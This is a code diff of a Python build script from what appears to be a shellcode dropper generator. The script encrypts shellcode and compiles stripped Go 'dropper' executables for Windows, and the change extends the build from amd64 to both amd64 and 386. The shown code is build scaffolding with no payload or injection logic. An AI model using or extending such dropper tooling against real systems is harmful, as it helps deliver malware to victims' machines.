@@ -70,19 +70,19 @@ def cipherShellcode(shellcodePath: str):
 
 
 
-def generate64BitsExeGoDroplet(outputPrefix: str):
+def generateExeGoDroplet(outputPrefix: str, arch: str):
 
-    exe64bitsPath = os.path.join(Path(__file__).parent, '../bin/' + outputPrefix + "64.exe")
-    earlyBirdMainPath = os.path.join(Path(__file__).parent, '../cmd/EarlyBird/main.go')
-    args = ("go", "build", "-a", "-ldflags", "-s -w", "-o", exe64bitsPath, earlyBirdMainPath)
+    exe64bitsPath = os.path.join(Path(__file__).parent, '../bin/' + outputPrefix + arch + ".exe")
+    exe64bitsGoMainPath = os.path.join(Path(__file__).parent, '../cmd/exe64bit/main.go')
+    args = ("go", "build", "-a", "-ldflags", "-s -w", "-o", exe64bitsPath, exe64bitsGoMainPath)
 
     popen = None
     exe64bits_env = os.environ.copy() 
     exe64bits_env["GOOS"] = "windows"
-    exe64bits_env["GOARCH"] = "amd64"
+    exe64bits_env["GOARCH"] = arch
     exe64bits_env["CGO_ENABLED"] = "0"
 
-    print("[+] Creating 64 bits exe dropper")
+    print("[+] Creating " + arch + " exe dropper")
 
     try:
         popen = subprocess.Popen(args, stdout=subprocess.PIPE, env=exe64bits_env)
@@ -94,16 +94,16 @@ def generate64BitsExeGoDroplet(outputPrefix: str):
         if popen.returncode != 0:
             raise Exception
         if not os.path.isfile(exe64bitsPath):
-            print("64 Bits Exe Droplet not created for some reason")
+            print(arch + " Exe Droplet not created for some reason")
             raise Exception
     except Exception as e:
         if popen and popen.stderr is not None:
             print(popen.stderr.read().decode("utf-8"))
         print(e)
-        print("[-] Failed to create 64 bit exe droplet")
+        print("[-] Failed to create " + arch + " exe droplet")
         exit(1)
 
-    print("[+] Created 64 bits exe dropper in " + exe64bitsPath)
+    print("[+] Created " + arch + " exe dropper in " + exe64bitsPath)
     return exe64bitsPath
 
 
@@ -113,7 +113,9 @@ def generateGoDroplets(binaryPath: str, binaryArg: str, format: str, outputPrefi
     cipheredShellcodePath, keyPath = cipherShellcode(shellcodePath)
 
     print(cipheredShellcodePath, keyPath)
-    generate64BitsExeGoDroplet(outputPrefix)
+
+    generateExeGoDroplet(outputPrefix, "amd64")
+    generateExeGoDroplet(outputPrefix, "386")
 
 
 def main():
